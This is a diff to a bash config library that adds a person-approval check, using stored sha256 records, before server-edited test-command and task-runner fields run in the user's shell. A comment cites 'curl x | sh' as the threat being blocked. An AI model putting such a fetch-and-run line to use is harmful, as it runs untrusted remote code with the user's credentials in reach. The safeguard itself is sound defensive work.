@@ -121,7 +121,7 @@ hero_md_field() {
 hero_field() {
   local root f
   root="${2:-$(hero_root)}"
-  f=$(hero_config_file "$root") || return 2
+  f=$(hero_config_file "$root") || return "$(( $? == 3 ? 3 : 2 ))"
   hero_md_field "$f" "$1"
 }
 
@@ -136,7 +136,7 @@ hero_field() {
 # `platform` repeats across sections, so a bare hero_field answers the wrong one.
 hero_field_in() { # ROOT KEY BLOCK [PARENT]
   local f
-  f=$(hero_config_file "$1") || return 2
+  f=$(hero_config_file "$1") || return "$(( $? == 3 ? 3 : 2 ))"
   hero_md_field "$f" "$2" "$3" "${4:-}"
 }
 
@@ -150,10 +150,11 @@ hero_config_file() { # [ROOT]
   printf '%s' "$root/HERO.md"
 }
 
-# Whether a readable config exists: rc 0 yes, 1 no, 2 could not ask.
+# Whether a readable config exists: rc 0 yes, 1 no, 2 could not ask, 3 the
+# server's command fields await a person's approval (hero_srv_commands_approve).
 hero_config_exists() { # [ROOT]
   local f
-  f=$(hero_config_file "${1:-}") || return 2
+  f=$(hero_config_file "${1:-}") || return "$(( $? == 3 ? 3 : 2 ))"
   [ -r "$f" ]
 }
 
@@ -161,7 +162,7 @@ hero_config_exists() { # [ROOT]
 # the source could not be asked.
 hero_config_show() { # [ROOT]
   local f
-  f=$(hero_config_file "${1:-}") || return 2
+  f=$(hero_config_file "${1:-}") || return "$(( $? == 3 ? 3 : 2 ))"
   [ -r "$f" ] || return 1
   cat "$f"
 }
@@ -179,7 +180,7 @@ hero_config_commit_time() { # [ROOT]
 # content, not rc: awk exits 0 on no match.
 hero_config_sections() { # ROOT NAME_ERE
   local f
-  f=$(hero_config_file "$1") || return 2
+  f=$(hero_config_file "$1") || return "$(( $? == 3 ? 3 : 2 ))"
   [ -r "$f" ] || return 1
   awk -v re="^## ($2)[[:space:]]*$" '/^## /{f = ($0 ~ re)} f' "$f"
 }
@@ -187,7 +188,7 @@ hero_config_sections() { # ROOT NAME_ERE
 # The body of the first `## NAME` section, heading excluded.
 hero_config_section_body() { # ROOT NAME
   local f
-  f=$(hero_config_file "$1") || return 2
+  f=$(hero_config_file "$1") || return "$(( $? == 3 ? 3 : 2 ))"
   [ -r "$f" ] || return 1
   awk -v n="## $2" 'index($0, n) == 1 {f=1; next} /^## /{f=0} f' "$f"
 }
@@ -197,7 +198,7 @@ hero_config_section_body() { # ROOT NAME
 # Matching only the first returns empty on those repos.
 hero_config_design_system() { # [ROOT]
   local f
-  f=$(hero_config_file "${1:-}") || return 2
+  f=$(hero_config_file "${1:-}") || return "$(( $? == 3 ? 3 : 2 ))"
   [ -r "$f" ] || return 1
   sed -n -e '/^### design-system/,/^#\{2,3\} /p' -e '/^## Design System/,/^## /p' "$f"
 }
@@ -206,7 +207,7 @@ hero_config_design_system() { # [ROOT]
 # hero_field returns only the first; `health-endpoint` legitimately repeats.
 hero_field_all() { # KEY [ROOT]
   local f
-  f=$(hero_config_file "${2:-}") || return 2
+  f=$(hero_config_file "${2:-}") || return "$(( $? == 3 ? 3 : 2 ))"
   [ -r "$f" ] || return 1
   awk -v k="- $1:" 'index($0, k) == 1 {sub(/^[^:]*: */, ""); print}' "$f"
 }
@@ -300,19 +301,20 @@ hero_connection_guard() { # KIND KEY VALUE [TYPE]
 }
 
 hero_connection() { # KIND KEY [ROOT]
-  local root value ctype
+  local root value ctype cfg
   root="${3:-$(hero_root)}" || return 1
-  value=$(hero_md_field "$(hero_config_file "$root")" "$2" "### $1" "## Connections") || return $?
+  cfg=$(hero_config_file "$root") || { [ $? -eq 3 ] && return 3; cfg=; }
+  value=$(hero_md_field "$cfg" "$2" "### $1" "## Connections") || return $?
   # The block's own `type` decides what shape `at` may take. Read straight from
   # hero_md_field, never back through hero_connection, which would recurse.
   # The compliance route's names are judged against the route's own type,
   # which defaults to the main one.
   case "$2" in
     at|compliance-type)
-      ctype=$(hero_md_field "$(hero_config_file "$root")" type "### $1" "## Connections" 2>/dev/null) ;;
+      ctype=$(hero_md_field "$cfg" type "### $1" "## Connections" 2>/dev/null) ;;
     compliance-team|compliance-project|compliance-label)
-      ctype=$(hero_md_field "$(hero_config_file "$root")" compliance-type "### $1" "## Connections" 2>/dev/null) ||
-        ctype=$(hero_md_field "$(hero_config_file "$root")" type "### $1" "## Connections" 2>/dev/null) ;;
+      ctype=$(hero_md_field "$cfg" compliance-type "### $1" "## Connections" 2>/dev/null) ||
+        ctype=$(hero_md_field "$cfg" type "### $1" "## Connections" 2>/dev/null) ;;
   esac
   hero_connection_guard "$1" "$2" "$value" "${ctype:-}" || return 2
   printf '%s' "$value"
@@ -468,9 +470,11 @@ hero_connection_repo() { # KIND [ROOT]
 # stderr line and the function returns 3 — same contract as hero_fleet_repos,
 # because the caller reacts to it the same way.
 hero_connections() { # [ROOT]
-  local root
+  local root rc
   root="${1:-$(hero_root)}" || return 1
-  hero_config_exists "$root" || return 1
+  hero_config_exists "$root"; rc=$?
+  [ $rc -eq 3 ] && return 3
+  [ $rc -eq 0 ] || return 1
   awk '
     # \034, not a tab, for the reason hero_fleet_repos gives (see its awk).
     # No apostrophe anywhere in this program: it is single-quoted, and one
@@ -3618,9 +3622,85 @@ hero_srv_inbox_count() { # STORE [claimed]
 
 # ----- config, fleet, audit
 
+# Every HERO.md line a skill passes to a shell, as `BLOCK<TAB>KEY<TAB>VALUE` in
+# file order: `task-runner` and any `*-command` key (test-command, dev-command,
+# ...). BLOCK is the nearest `###` or `##` heading above the line. Fenced
+# blocks are skipped, as the connection reader skips them.
+_hero_srv_command_fields() { # FILE
+  [ -r "$1" ] || return 0
+  awk '
+    /^```/ { fence = !fence; next }
+    fence  { next }
+    /^##+ / { blk = $0; sub(/^#+ +/, "", blk); sub(/[[:space:]]+$/, "", blk); next }
+    /^- (task-runner|[A-Za-z0-9_-]+-command):/ {
+      k = $0; sub(/^- /, "", k); sub(/:.*/, "", k)
+      v = $0; sub(/^[^:]*: */, "", v)
+      printf "%s\t%s\t%s\n", blk, k, v
+    }
+  ' "$1"
+}
+
+_hero_sha256() {
+  if command -v sha256sum >/dev/null 2>&1; then sha256sum | cut -d' ' -f1; else shasum -a 256 | cut -d' ' -f1; fi
+}
+
+# Where the person's approval of ROOT's server-held commands is recorded: one
+# file per server, workspace and project, under the user's own config dir
+# (XDG_CONFIG_HOME honoured, as the pin file does).
+_hero_srv_approval_file() { # ROOT
+  local t k
+  t=$(hero_srv_target "$1") || return 1
+  k=$(printf '%s %s' "$t" "${1##*/}" | _hero_sha256)
+  printf '%s' "${XDG_CONFIG_HOME:-$HOME/.config}/wayfare/approved-commands/$k"
+}
+
+# rc 0 when the command fields of FILE are the ones a person approved (or there
+# are none and none were approved), rc 3 when they are not, with the changed
+# fields on stderr. HERO.md is committed locally, so a changed test-command
+# needs a reviewed PR; the server's copy is editable in the app, and without
+# this a changed `test-command: curl x | sh` runs on the next push-pr, with the
+# person's credentials in reach. The record holds the sha256 on its first line
+# and the approved fields after it, so the diff can name what changed.
+hero_srv_commands_approved() { # ROOT FILE
+  local rec cur now old
+  rec=$(_hero_srv_approval_file "$1") || return 1
+  cur=$(_hero_srv_command_fields "$2")
+  now=$(printf '%s\n' "$cur" | _hero_sha256)
+  if [ -r "$rec" ]; then
+    old=$(sed -n 1p "$rec")
+  else
+    old=$(printf '\n' | _hero_sha256)
+  fi
+  [ "$now" = "$old" ] && return 0
+  {
+    echo "hero: the Wayfare server's HERO.md for ${1##*/} has command fields no person on this machine has approved. They run in the person's shell, so they are not run until approved:"
+    printf '%s\n' "$cur" | sed '/^$/d' | while IFS=$'\t' read -r b k v; do
+      grep -qxF "$b	$k	$v" <(sed 1d "$rec" 2>/dev/null) || printf '  changed or new: [%s] %s: %s\n' "$b" "$k" "$v"
+    done
+    sed 1d "$rec" 2>/dev/null | while IFS=$'\t' read -r b k v; do
+      printf '%s\n' "$cur" | grep -qxF "$b	$k	$v" || printf '  was approved: [%s] %s: %s\n' "$b" "$k" "$v"
+    done
+    echo "hero: after the person confirms them, run hero_srv_commands_approve $1"
+  } >&2
+  return 3
+}
+
+# Record the command fields now rendered for ROOT as approved. The caller has
+# shown them to a person and got a yes; an unattended run never calls this.
+hero_srv_commands_approve() { # ROOT
+  local rec cache cur
+  rec=$(_hero_srv_approval_file "$1") || return 1
+  cache=$(hero_srv_cache "$1") || return 1
+  cur=$(_hero_srv_command_fields "$cache/HERO.md")
+  mkdir -p "${rec%/*}" && chmod 700 "${rec%/*}" || return 1
+  ( umask 077; { printf '%s\n' "$cur" | _hero_sha256; printf '%s\n' "$cur" | sed '/^$/d'; } > "$rec.tmp" ) || return 1
+  mv "$rec.tmp" "$rec" && chmod 600 "$rec"
+}
+
 # The server's HERO.md for ROOT, rendered where the config readers can open it.
 # A repo with no config there prints a path that is never written, which reads
 # as "no config" through hero_config_exists, as a repo with no HERO.md does.
+# rc 3 (no path printed) when its command fields are not yet approved.
 hero_srv_config_file() { # ROOT
   local pid json cache tmp
   pid=$(hero_srv_project "$1") || return 1
@@ -3628,12 +3708,14 @@ hero_srv_config_file() { # ROOT
   printf '%s' "$json" | jq -e '.data | objects' >/dev/null || { _hero_srv_shape "$1" config; return 1; }
   cache=$(hero_srv_cache "$1") || return 1
   if [ "$(printf '%s' "$json" | jq -r '.data.exists // false')" != true ]; then
+    rm -f "$cache/HERO.md"
     printf '%s' "$cache/no-HERO.md"; return 0
   fi
   tmp=$(mktemp "$cache/.HERO.XXXXXX") || return 1
   printf '%s' "$json" | jq -j '.data.markdown // ""' > "$tmp" || { rm -f "$tmp"; return 1; }
   chmod a-w "$tmp"
   _hero_replace "$tmp" "$cache/HERO.md" || return 1
+  hero_srv_commands_approved "$1" "$cache/HERO.md" || return $?
   printf '%s' "$cache/HERO.md"
 }
 
